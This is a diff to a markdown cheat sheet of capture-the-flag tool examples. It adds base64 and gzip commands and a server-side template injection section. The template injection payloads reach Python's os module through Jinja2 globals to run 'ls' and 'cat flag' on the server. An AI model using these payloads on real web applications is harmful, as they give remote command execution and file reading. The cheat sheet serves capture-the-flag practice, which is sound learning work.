@@ -296,4 +296,22 @@ echo "48656c6c6f" | xxd -r -p
 7z l archive.zip  # List contents
 ```
 
+## SSTI
+
+```python
+# Check environment (optional)
+{{config}}
+
+{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
+```
+
+## base64
+
+```bash
+echo -n "d3BqdkpBTXtqaGx6aHlfazNqeTl3YTNrX20wMjEyNzU4fQ==" | base64 -d
+```
+
+`gzip -d disko-1.dd.gz`
+
 [Back to Top](#ctf-tools-examples--use-cases)
